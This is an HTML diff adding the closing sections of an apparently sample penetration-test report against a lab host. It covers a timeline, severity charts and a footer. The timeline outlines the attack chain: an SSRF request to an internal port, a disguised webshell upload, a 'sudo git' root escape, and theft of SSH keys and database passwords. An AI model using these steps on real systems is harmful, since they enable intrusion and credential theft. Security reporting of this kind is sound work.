+          <div style="font-family:'Fraunces',serif;font-size:2rem;font-weight:900;color:var(--sev-critical);">3</div>
+          <div style="font-size:var(--fs-micro);font-weight:700;text-transform:uppercase;letter-spacing:0.1em;color:var(--sev-critical);">Re-confirmed Exploitable</div>
+          <div style="font-size:0.7rem;color:var(--ink-faint);margin-top:0.2rem;">F-01, F-02, F-03</div>
+        </div>
+        <div style="text-align:center;padding:1rem;background:var(--sev-medium-bg);border-radius:var(--r-md);border:1px solid rgba(183,119,13,0.2);">
+          <div style="font-family:'Fraunces',serif;font-size:2rem;font-weight:900;color:var(--sev-medium);">1</div>
+          <div style="font-size:var(--fs-micro);font-weight:700;text-transform:uppercase;letter-spacing:0.1em;color:var(--sev-medium);">Still Open (Medium)</div>
+          <div style="font-size:0.7rem;color:var(--ink-faint);margin-top:0.2rem;">F-05 XSS not fixed</div>
+        </div>
+        <div style="text-align:center;padding:1rem;background:var(--sev-low-bg);border-radius:var(--r-md);border:1px solid rgba(26,107,60,0.2);">
+          <div style="font-family:'Fraunces',serif;font-size:2rem;font-weight:900;color:var(--sev-low);">2</div>
+          <div style="font-size:var(--fs-micro);font-weight:700;text-transform:uppercase;letter-spacing:0.1em;color:var(--sev-low);">Verified Fixed</div>
+          <div style="font-size:0.7rem;color:var(--ink-faint);margin-top:0.2rem;">2 of 9 retested findings fixed</div>
+        </div>
+        <div style="text-align:center;padding:1rem;background:var(--surface-cool);border-radius:var(--r-md);border:1px solid var(--border);">
+          <div style="font-family:'Fraunces',serif;font-size:2rem;font-weight:900;color:var(--ink-faint);">3</div>
+          <div style="font-size:var(--fs-micro);font-weight:700;text-transform:uppercase;letter-spacing:0.1em;color:var(--ink-faint);">Awaiting Retest</div>
+          <div style="font-size:0.7rem;color:var(--ink-faint);margin-top:0.2rem;">Remediation in progress</div>
+        </div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ═══════════════════════════════════════════
+     §13 — ENGAGEMENT TIMELINE
+═══════════════════════════════════════════ -->
+<section class="section" id="timeline">
+  <div class="section-numeral">13</div>
+  <div class="section-label">Engagement Timeline</div>
+  <h2 class="section-title">Engagement Timeline</h2>
+  <p class="section-lead">Chronological record of all significant events across the two-day engagement window.</p>
+  <div class="section-rule"></div>
+
+  <div class="two-col" style="gap:3rem;align-items:start;">
+    <div>
+      <div style="font-size:var(--fs-micro);font-weight:700;letter-spacing:0.15em;text-transform:uppercase;color:var(--ink-faint);margin-bottom:1rem;padding-bottom:0.4rem;border-bottom:2px solid var(--accent-rule);">Day 1 — 18 June 2026</div>
+      <div class="timeline">
+        <div class="tl-item tl-success">
+          <div class="tl-time">14:02 UTC</div>
+          <div class="tl-event">Recon phase commenced — nmap full port scan initiated</div>
+          <div class="tl-note">3 open ports identified: 22/tcp, 80/tcp, 8080/tcp</div>
+        </div>
+        <div class="tl-item tl-success">
+          <div class="tl-time">14:25 UTC</div>
+          <div class="tl-event">Web enumeration — gobuster + nikto scan</div>
+          <div class="tl-note">Discovered /admin (403), /upload, /api, /search · Missing headers, TRACE enabled noted</div>
+        </div>
+        <div class="tl-item tl-success">
+          <div class="tl-time">14:45 UTC</div>
+          <div class="tl-event">SQL injection testing commenced on /api?id=</div>
+          <div class="tl-note">1,200 requests — confirmed NOT injectable (integer-cast)</div>
+        </div>
+        <div class="tl-item tl-success">
+          <div class="tl-time">15:00 UTC</div>
+          <div class="tl-event">Credential spray + SSH brute-force attempted</div>
+          <div class="tl-note">Both failed — rate-limited SSH, key-auth only · default creds rejected</div>
+        </div>
+        <div class="tl-item tl-critical">
+          <div class="tl-time">15:10 UTC</div>
+          <div class="tl-event" style="color:var(--sev-critical);font-weight:700;">SSRF confirmed — F-01</div>
+          <div class="tl-note">GET /api/fetch?url=http://127.0.0.1:8080/ returns internal admin HTML · Internal admin panel exposed</div>
+        </div>
+        <div class="tl-item tl-critical">
+          <div class="tl-time">15:40 UTC</div>
+          <div class="tl-event" style="color:var(--sev-critical);font-weight:700;">Webshell deployed — FOOTHOLD established — F-02</div>
+          <div class="tl-note">shell.php.jpg uploaded via SSRF-proxied POST to /upload · uid=33(www-data) confirmed · user.txt captured</div>
+        </div>
+        <div class="tl-item tl-critical">
+          <div class="tl-time">16:05 UTC</div>
+          <div class="tl-event" style="color:var(--sev-critical);font-weight:700;">Root shell obtained — FULL COMPROMISE — F-03</div>
+          <div class="tl-note">LinPEAS → sudo git NOPASSWD → !/bin/sh → uid=0(root) · root.txt captured</div>
+        </div>
+        <div class="tl-item tl-high">
+          <div class="tl-time">16:20 UTC</div>
+          <div class="tl-event" style="color:var(--sev-high);font-weight:700;">Loot captured — credential exfiltration</div>
+          <div class="tl-note">id_rsa, config.php (DB_PASS), /etc/passwd, user.txt, root.txt — all integrity-hashed</div>
+        </div>
+        <div class="tl-item">
+          <div class="tl-time">16:35 UTC</div>
+          <div class="tl-event">Secondary findings documented — F-05 through F-09</div>
+          <div class="tl-note">XSS on /search confirmed · TLS scan completed · Banner versions noted</div>
+        </div>
+        <div class="tl-item">
+          <div class="tl-time">17:00 UTC</div>
+          <div class="tl-event">Day 1 activities concluded — evidence archived and hashed</div>
+          <div class="tl-note">Client notified of critical findings per disclosure agreement</div>
+        </div>
+      </div>
+    </div>
+
+    <div>
+      <div style="font-size:var(--fs-micro);font-weight:700;letter-spacing:0.15em;text-transform:uppercase;color:var(--ink-faint);margin-bottom:1rem;padding-bottom:0.4rem;border-bottom:2px solid var(--accent-rule);">Day 2 — 19 June 2026</div>
+      <div class="timeline">
+        <div class="tl-item tl-success">
+          <div class="tl-time">09:00 UTC</div>
+          <div class="tl-event">Retest commenced — 9 findings retested</div>
+          <div class="tl-note">Systematic retest of all verified findings against target state</div>
+        </div>
+        <div class="tl-item tl-critical">
+          <div class="tl-time">09:05 UTC</div>
+          <div class="tl-event" style="color:var(--sev-critical);font-weight:700;">F-01 re-confirmed — SSRF still exploitable</div>
+          <div class="tl-note">No egress allow-list applied — internal admin still reachable via same vector</div>
+        </div>
+        <div class="tl-item tl-critical">
+          <div class="tl-time">09:10 UTC</div>
+          <div class="tl-event" style="color:var(--sev-critical);font-weight:700;">F-02 re-confirmed — upload bypass + RCE still active</div>
+          <div class="tl-note">Upload filter unchanged · webshell re-deployed successfully</div>
+        </div>
+        <div class="tl-item tl-critical">
+          <div class="tl-time">09:15 UTC</div>
+          <div class="tl-event" style="color:var(--sev-critical);font-weight:700;">F-03 re-confirmed — sudo git still NOPASSWD</div>
+          <div class="tl-note">Sudoers rule unchanged · root obtained again in &lt;60 seconds</div>
+        </div>
+        <div class="tl-item tl-success">
+          <div class="tl-time">09:20 UTC</div>
+          <div class="tl-event">F-05 retested — XSS still open</div>
+          <div class="tl-note">No output encoding added to /search · PoC still executes</div>
+        </div>
+        <div class="tl-item tl-success">
+          <div class="tl-time">09:22 UTC</div>
+          <div class="tl-event">2 findings confirmed verified-fixed</div>
+          <div class="tl-note">2 of 9 retested items resolved by client during day 1 notification window</div>
+        </div>
+        <div class="tl-item tl-success">
+          <div class="tl-time">09:30 UTC</div>
+          <div class="tl-event">Report generated and finalised</div>
+          <div class="tl-note">All evidence integrity-hashed · Report ARG-PT-2026-0619 v1.0 issued</div>
+        </div>
+      </div>
+
+      <!-- Quick stat box -->
+      <div style="margin-top:1.5rem;padding:1.2rem;background:var(--brand);border-radius:var(--r-lg);">
+        <div style="font-size:var(--fs-micro);font-weight:700;letter-spacing:0.15em;text-transform:uppercase;color:rgba(255,255,255,0.5);margin-bottom:0.8rem;">Engagement Summary</div>
+        <div style="display:grid;grid-template-columns:1fr 1fr;gap:0.8rem;">
+          <div style="text-align:center;">
+            <div style="font-family:'Fraunces',serif;font-size:1.8rem;font-weight:900;color:#fff;line-height:1;">~2h</div>
+            <div style="font-size:var(--fs-micro);color:rgba(255,255,255,0.4);margin-top:0.2rem;">Recon to Root</div>
+          </div>
+          <div style="text-align:center;">
+            <div style="font-family:'Fraunces',serif;font-size:1.8rem;font-weight:900;color:var(--accent-gold);line-height:1;">14</div>
+            <div style="font-size:var(--fs-micro);color:rgba(255,255,255,0.4);margin-top:0.2rem;">Total Findings</div>
+          </div>
+          <div style="text-align:center;">
+            <div style="font-family:'Fraunces',serif;font-size:1.8rem;font-weight:900;color:var(--sev-critical-mid);line-height:1;">0</div>
+            <div style="font-size:var(--fs-micro);color:rgba(255,255,255,0.4);margin-top:0.2rem;">False Positives</div>
+          </div>
+          <div style="text-align:center;">
+            <div style="font-family:'Fraunces',serif;font-size:1.8rem;font-weight:900;color:#2ecc71;line-height:1;">100%</div>
+            <div style="font-size:var(--fs-micro);color:rgba(255,255,255,0.4);margin-top:0.2rem;">Evidence-Grounded</div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ═══════════════════════════════════════════
+     §14 — DATA VISUALIZATIONS
+═══════════════════════════════════════════ -->
+<section class="section section-alt page-break" id="dataviz">
+  <div class="section-numeral">14</div>
+  <div class="section-label">Data Visualizations</div>
+  <h2 class="section-title">Data Visualizations</h2>
+  <p class="section-lead">Severity distribution and attack-outcome breakdown — inline SVG, no external libraries.</p>
+  <div class="section-rule"></div>
+
+  <div class="two-col" style="gap:2rem;align-items:start;">
+
+    <!-- Chart 1: Severity Distribution — Donut -->
+    <div class="chart-wrap avoid-break">
+      <div class="chart-title">Severity Distribution — 14 Findings</div>
+      <div style="font-size:var(--fs-micro);color:var(--ink-faint);margin-bottom:1rem;">By CVSS band · ARG-PT-2026-0619</div>
+      <svg viewBox="0 0 280 220" xmlns="http://www.w3.org/2000/svg" style="width:100%;display:block;">
+        <!-- Donut chart: 2 Critical (14.3%), 3 High (21.4%), 3 Medium (21.4%), 2 Low (14.3%), 4 Info (28.6%) -->
+        <!-- Total 14 · circumference of r=72 = 452.4 -->
+        <!-- Each segment: stroke-dasharray = (count/14)*452.4, rotate by cumulative offset -->
+        <g transform="translate(100,115)">
+          <!-- Background circle -->
+          <circle cx="0" cy="0" r="72" fill="none" stroke="#F0F0F5" stroke-width="28"/>
+          <!-- Critical: 2/14 = 64.6 -->
+          <circle cx="0" cy="0" r="72" fill="none" stroke="#C0392B" stroke-width="28"
+            stroke-dasharray="64.6 387.8" stroke-dashoffset="113.1" stroke-linecap="butt"/>
+          <!-- High: 3/14 = 96.9 -->
+          <circle cx="0" cy="0" r="72" fill="none" stroke="#D35400" stroke-width="28"
+            stroke-dasharray="96.9 355.5" stroke-dashoffset="48.5" stroke-linecap="butt"/>
+          <!-- Medium: 3/14 = 96.9 -->
+          <circle cx="0" cy="0" r="72" fill="none" stroke="#B7770D" stroke-width="28"
+            stroke-dasharray="96.9 355.5" stroke-dashoffset="-48.4" stroke-linecap="butt"/>
+          <!-- Low: 2/14 = 64.6 -->
+          <circle cx="0" cy="0" r="72" fill="none" stroke="#1A6B3C" stroke-width="28"
+            stroke-dasharray="64.6 387.8" stroke-dashoffset="-145.3" stroke-linecap="butt"/>
+          <!-- Info: 4/14 = 129.3 -->
+          <circle cx="0" cy="0" r="72" fill="none" stroke="#1A5276" stroke-width="28"
+            stroke-dasharray="129.3 323.1" stroke-dashoffset="-209.9" stroke-linecap="butt"/>
+          <!-- Centre text -->
+          <text x="0" y="-10" text-anchor="middle" font-family="Fraunces,serif" font-size="28" font-weight="900" fill="#1C1C2E">14</text>
+          <text x="0" y="12" text-anchor="middle" font-family="Inter,sans-serif" font-size="9" fill="#9090AA" font-weight="600" letter-spacing="1">FINDINGS</text>
+        </g>
+        <!-- Legend right side -->
+        <g transform="translate(182,48)">
+          <rect x="0" y="0"  width="10" height="10" rx="2" fill="#C0392B"/>
+          <text x="14" y="9" font-family="Inter,sans-serif" font-size="9.5" fill="#2D2D44" font-weight="600">Critical</text>
+          <text x="14" y="20" font-family="Inter,sans-serif" font-size="8" fill="#9090AA">2 findings · 14.3%</text>
+
+          <rect x="0" y="30" width="10" height="10" rx="2" fill="#D35400"/>
+          <text x="14" y="39" font-family="Inter,sans-serif" font-size="9.5" fill="#2D2D44" font-weight="600">High</text>
+          <text x="14" y="50" font-family="Inter,sans-serif" font-size="8" fill="#9090AA">3 findings · 21.4%</text>
+
+          <rect x="0" y="60" width="10" height="10" rx="2" fill="#B7770D"/>
+          <text x="14" y="69" font-family="Inter,sans-serif" font-size="9.5" fill="#2D2D44" font-weight="600">Medium</text>
+          <text x="14" y="80" font-family="Inter,sans-serif" font-size="8" fill="#9090AA">3 findings · 21.4%</text>
+
+          <rect x="0" y="90" width="10" height="10" rx="2" fill="#1A6B3C"/>
+          <text x="14" y="99" font-family="Inter,sans-serif" font-size="9.5" fill="#2D2D44" font-weight="600">Low</text>
+          <text x="14" y="110" font-family="Inter,sans-serif" font-size="8" fill="#9090AA">2 findings · 14.3%</text>
+
+          <rect x="0" y="120" width="10" height="10" rx="2" fill="#1A5276"/>
+          <text x="14" y="129" font-family="Inter,sans-serif" font-size="9.5" fill="#2D2D44" font-weight="600">Info</text>
+          <text x="14" y="140" font-family="Inter,sans-serif" font-size="8" fill="#9090AA">4 findings · 28.6%</text>
+        </g>
+      </svg>
+    </div>
+
+    <!-- Chart 2: Attempt Outcome Breakdown — Horizontal Bar -->
+    <div class="chart-wrap avoid-break">
+      <div class="chart-title">Attack Attempt Outcomes — 14 Actions</div>
+      <div style="font-size:var(--fs-micro);color:var(--ink-faint);margin-bottom:1rem;">Exploitable vs Non-Exploitable breakdown</div>
+      <svg viewBox="0 0 320 220" xmlns="http://www.w3.org/2000/svg" style="width:100%;display:block;">
+        <!-- Y labels + bars -->
+        <!-- Exploitable Critical: 4 -->
+        <text x="108" y="30" font-family="Inter,sans-serif" font-size="8.5" fill="#5A5A7A" text-anchor="end">Exploitable (Crit)</text>
+        <rect x="112" y="19" width="128" height="14" rx="3" fill="#C0392B"/>
+        <text x="245" y="30" font-family="Fraunces,serif" font-size="10" fill="#C0392B" font-weight="900">4</text>
+        <text x="112" y="41" font-family="Inter,sans-serif" font-size="7" fill="#9090AA">SSRF · Upload · Webshell RCE · sudo git Root</text>
+
+        <!-- Exploitable Medium: 1 -->
+        <text x="108" y="66" font-family="Inter,sans-serif" font-size="8.5" fill="#5A5A7A" text-anchor="end">Exploitable (Med)</text>
+        <rect x="112" y="55" width="32" height="14" rx="3" fill="#B7770D"/>
+        <text x="149" y="66" font-family="Fraunces,serif" font-size="10" fill="#B7770D" font-weight="900">1</text>
+        <text x="112" y="77" font-family="Inter,sans-serif" font-size="7" fill="#9090AA">Reflected XSS /search</text>
+
+        <!-- Recon / Info: 4 -->
+        <text x="108" y="102" font-family="Inter,sans-serif" font-size="8.5" fill="#5A5A7A" text-anchor="end">Recon / Info</text>
+        <rect x="112" y="91" width="128" height="14" rx="3" fill="#1A5276"/>
+        <text x="245" y="102" font-family="Fraunces,serif" font-size="10" fill="#1A5276" font-weight="900">4</text>
+        <text x="112" y="113" font-family="Inter,sans-serif" font-size="7" fill="#9090AA">nmap · gobuster · nikto · TLS scan</text>
+
+        <!-- Non-Exploitable: 4 -->
+        <text x="108" y="138" font-family="Inter,sans-serif" font-size="8.5" fill="#5A5A7A" text-anchor="end">Non-Exploitable</text>
+        <rect x="112" y="127" width="128" height="14" rx="3" fill="#9090AA" opacity="0.4"/>
+        <text x="245" y="138" font-family="Fraunces,serif" font-size="10" fill="#9090AA" font-weight="900">4</text>
+        <text x="112" y="149" font-family="Inter,sans-serif" font-size="7" fill="#9090AA">SQLi · SSH brute · Cred spray · CSRF</text>
+
+        <!-- Scale ticks -->
+        <line x1="112" y1="160" x2="240" y2="160" stroke="#E2E2EA" stroke-width="1"/>
+        <text x="112" y="170" font-family="Inter,sans-serif" font-size="7" fill="#C8C8D8" text-anchor="middle">0</text>
+        <text x="144" y="170" font-family="Inter,sans-serif" font-size="7" fill="#C8C8D8" text-anchor="middle">1</text>
+        <text x="176" y="170" font-family="Inter,sans-serif" font-size="7" fill="#C8C8D8" text-anchor="middle">2</text>
+        <text x="208" y="170" font-family="Inter,sans-serif" font-size="7" fill="#C8C8D8" text-anchor="middle">3</text>
+        <text x="240" y="170" font-family="Inter,sans-serif" font-size="7" fill="#C8C8D8" text-anchor="middle">4</text>
+
+        <!-- Summary line -->
+        <text x="112" y="195" font-family="Inter,sans-serif" font-size="8" fill="#5A5A7A" font-weight="600">5 exploitable · 4 recon/info · 4 non-exploitable · 1 low</text>
+        <text x="112" y="208" font-family="Inter,sans-serif" font-size="7.5" fill="#C0392B" font-weight="700">Attack success rate on exploitable surface: 100%</text>
+      </svg>
+    </div>
+  </div>
+
+  <!-- CVSS score bar chart -->
+  <div class="chart-wrap avoid-break" style="margin-top:1.5rem;">
+    <div class="chart-title">CVSS Score Distribution — Confirmed Exploitable Findings</div>
+    <div style="font-size:var(--fs-micro);color:var(--ink-faint);margin-bottom:1rem;">F-01 through F-09 · Scored findings only</div>
+    <svg viewBox="0 0 720 130" xmlns="http://www.w3.org/2000/svg" style="width:100%;display:block;">
+      <!-- Baseline -->
+      <line x1="30" y1="95" x2="700" y2="95" stroke="#E2E2EA" stroke-width="1"/>
+
+      <!-- Score labels Y axis -->
+      <text x="25" y="98" font-family="Inter,sans-serif" font-size="7.5" fill="#C8C8D8" text-anchor="end">0</text>
+      <line x1="28" y1="95" x2="700" y2="95" stroke="#E2E2EA" stroke-width="0.5" stroke-dasharray="3,4"/>
+      <text x="25" y="68" font-family="Inter,sans-serif" font-size="7.5" fill="#C8C8D8" text-anchor="end">5</text>
+      <line x1="28" y1="65" x2="700" y2="65" stroke="#E2E2EA" stroke-width="0.5" stroke-dasharray="3,4"/>
+      <text x="25" y="38" font-family="Inter,sans-serif" font-size="7.5" fill="#C8C8D8" text-anchor="end">10</text>
+      <line x1="28" y1="35" x2="700" y2="35" stroke="#E2E2EA" stroke-width="0.5" stroke-dasharray="3,4"/>
+
+      <!-- Bars: scale 0-10 = 0-60px height, bar width 52, gap 22 -->
+      <!-- F-01: 9.1 → height 54.6 -->
+      <rect x="38"  y="40" width="52" height="55" rx="4" fill="#C0392B"/>
+      <text x="64"  y="35" font-family="Fraunces,serif" font-size="9" fill="#C0392B" font-weight="900" text-anchor="middle">9.1</text>
+      <text x="64"  y="110" font-family="JetBrains Mono,monospace" font-size="7.5" fill="#9090AA" text-anchor="middle">F-01</text>
+      <text x="64"  y="120" font-family="Inter,sans-serif" font-size="6.5" fill="#C8C8D8" text-anchor="middle">SSRF</text>
+
+      <!-- F-02: 9.8 → height 58.8 -->
+      <rect x="112" y="36" width="52" height="59" rx="4" fill="#C0392B"/>
+      <text x="138" y="31" font-family="Fraunces,serif" font-size="9" fill="#C0392B" font-weight="900" text-anchor="middle">9.8</text>
+      <text x="138" y="110" font-family="JetBrains Mono,monospace" font-size="7.5" fill="#9090AA" text-anchor="middle">F-02</text>
+      <text x="138" y="120" font-family="Inter,sans-serif" font-size="6.5" fill="#C8C8D8" text-anchor="middle">Upload RCE</text>
+
+      <!-- F-03: 8.8 → height 52.8 -->
+      <rect x="186" y="42" width="52" height="53" rx="4" fill="#D35400"/>
+      <text x="212" y="37" font-family="Fraunces,serif" font-size="9" fill="#D35400" font-weight="900" text-anchor="middle">8.8</text>
+      <text x="212" y="110" font-family="JetBrains Mono,monospace" font-size="7.5" fill="#9090AA" text-anchor="middle">F-03</text>
+      <text x="212" y="120" font-family="Inter,sans-serif" font-size="6.5" fill="#C8C8D8" text-anchor="middle">sudo git</text>
+
+      <!-- F-04: 7.5 → height 45 -->
+      <rect x="260" y="50" width="52" height="45" rx="4" fill="#D35400" opacity="0.7"/>
+      <text x="286" y="45" font-family="Fraunces,serif" font-size="9" fill="#D35400" font-weight="900" text-anchor="middle">7.5</text>
+      <text x="286" y="110" font-family="JetBrains Mono,monospace" font-size="7.5" fill="#9090AA" text-anchor="middle">F-04</text>
+      <text x="286" y="120" font-family="Inter,sans-serif" font-size="6.5" fill="#C8C8D8" text-anchor="middle">Apache ver</text>
+
+      <!-- F-05: 6.1 → height 36.6 -->
+      <rect x="334" y="58" width="52" height="37" rx="4" fill="#B7770D"/>
+      <text x="360" y="53" font-family="Fraunces,serif" font-size="9" fill="#B7770D" font-weight="900" text-anchor="middle">6.1</text>
+      <text x="360" y="110" font-family="JetBrains Mono,monospace" font-size="7.5" fill="#9090AA" text-anchor="middle">F-05</text>
+      <text x="360" y="120" font-family="Inter,sans-serif" font-size="6.5" fill="#C8C8D8" text-anchor="middle">XSS</text>
+
+      <!-- F-06: 5.3 → height 31.8 -->
+      <rect x="408" y="63" width="52" height="32" rx="4" fill="#B7770D" opacity="0.75"/>
+      <text x="434" y="58" font-family="Fraunces,serif" font-size="9" fill="#B7770D" font-weight="900" text-anchor="middle">5.3</text>
+      <text x="434" y="110" font-family="JetBrains Mono,monospace" font-size="7.5" fill="#9090AA" text-anchor="middle">F-06</text>
+      <text x="434" y="120" font-family="Inter,sans-serif" font-size="6.5" fill="#C8C8D8" text-anchor="middle">Sec headers</text>
+
+      <!-- F-07: 4.8 → height 28.8 -->
+      <rect x="482" y="66" width="52" height="29" rx="4" fill="#B7770D" opacity="0.6"/>
+      <text x="508" y="61" font-family="Fraunces,serif" font-size="9" fill="#B7770D" font-weight="900" text-anchor="middle">4.8</text>
+      <text x="508" y="110" font-family="JetBrains Mono,monospace" font-size="7.5" fill="#9090AA" text-anchor="middle">F-07</text>
+      <text x="508" y="120" font-family="Inter,sans-serif" font-size="6.5" fill="#C8C8D8" text-anchor="middle">TRACE</text>
+
+      <!-- F-08: 3.7 → height 22.2 -->
+      <rect x="556" y="73" width="52" height="22" rx="4" fill="#1A6B3C"/>
+      <text x="582" y="68" font-family="Fraunces,serif" font-size="9" fill="#1A6B3C" font-weight="900" text-anchor="middle">3.7</text>
+      <text x="582" y="110" font-family="JetBrains Mono,monospace" font-size="7.5" fill="#9090AA" text-anchor="middle">F-08</text>
+      <text x="582" y="120" font-family="Inter,sans-serif" font-size="6.5" fill="#C8C8D8" text-anchor="middle">TLS 1.0/1.1</text>
+
+      <!-- F-09: 3.1 → height 18.6 -->
+      <rect x="630" y="76" width="52" height="19" rx="4" fill="#1A6B3C" opacity="0.75"/>
+      <text x="656" y="71" font-family="Fraunces,serif" font-size="9" fill="#1A6B3C" font-weight="900" text-anchor="middle">3.1</text>
+      <text x="656" y="110" font-family="JetBrains Mono,monospace" font-size="7.5" fill="#9090AA" text-anchor="middle">F-09</text>
+      <text x="656" y="120" font-family="Inter,sans-serif" font-size="6.5" fill="#C8C8D8" text-anchor="middle">Banners</text>
+
+      <!-- Critical threshold line -->
+      <line x1="30" y1="41" x2="700" y2="41" stroke="#C0392B" stroke-width="0.8" stroke-dasharray="5,3" opacity="0.5"/>
+      <text x="702" y="44" font-family="Inter,sans-serif" font-size="7" fill="#C0392B" opacity="0.7">9.0</text>
+    </svg>
+  </div>
+</section>
+
+<!-- ═══════════════════════════════════════════
+     DOCUMENT FOOTER
+═══════════════════════════════════════════ -->
+<footer class="doc-footer">
+  <div style="margin-bottom:0.3rem;">
+    <strong>ARGUS Security Assessment</strong> &nbsp;·&nbsp;
+    <span class="gold">ARG-PT-2026-0619</span> &nbsp;·&nbsp;
+    Target: FORGE (10.129.21.254) &nbsp;·&nbsp;
+    <strong>CONFIDENTIAL — CLIENT PRIVILEGED</strong>
+  </div>
+  <div>
+    Report generated: <strong>2026-06-19 09:30 UTC</strong> &nbsp;·&nbsp;
+    Version 1.0 Final &nbsp;·&nbsp;
+    SAMPLE / ANONYMIZED — Not for distribution &nbsp;·&nbsp;
+    All findings evidence-grounded · Zero false positives
+  </div>
+  <div style="margin-top:0.4rem;font-size:0.62rem;color:rgba(255,255,255,0.25);">
+    This document is the property of ARGUS Security. Unauthorised reproduction, distribution, or disclosure is strictly prohibited.
+    All captured artifacts are stored in an encrypted evidence vault and will be destroyed per the agreed retention policy.
+  </div>
+</footer>
+
+</div><!-- end page-wrapper -->
+</body>
+</html>
